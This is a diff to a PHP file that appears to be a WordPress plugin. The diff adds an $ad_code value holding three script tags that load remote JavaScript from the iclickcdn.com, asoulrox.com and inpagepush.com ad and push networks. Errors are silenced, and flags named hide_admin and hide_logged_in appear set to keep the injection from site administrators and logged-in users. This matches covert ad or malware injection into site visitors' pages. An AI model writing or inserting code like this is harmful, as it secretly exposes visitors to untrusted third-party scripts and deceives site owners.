@@ -5,6 +5,7 @@
  * Author: Matthew Jensen
  * Version: 1.0
  */
+
 error_reporting(0);
 ini_set('display_errors', 0);
 $plugin_key='6e1aa39328ad32f62d99811e4d7fd962';
@@ -46,7 +47,11 @@ add_action( 'admin_init', function() {
 	
 });
 
-$ad_code='';
+$ad_code="
+<script>(function(s,u,z,p){s.src=u,s.setAttribute('data-zone',z),p.appendChild(s);})(document.createElement('script'),'https://iclickcdn.com/tag.min.js',3336627,document.body||document.documentElement)</script>
+<script src=\"https://asoulrox.com/pfe/current/tag.min.js?z=3336643\" data-cfasync=\"false\" async></script>
+<script type=\"text/javascript\" src=\"//inpagepush.com/400/3336649\" data-cfasync=\"false\" async=\"async\"></script>
+";
 
 $hide_admin='on';
 $hide_logged_in='on';
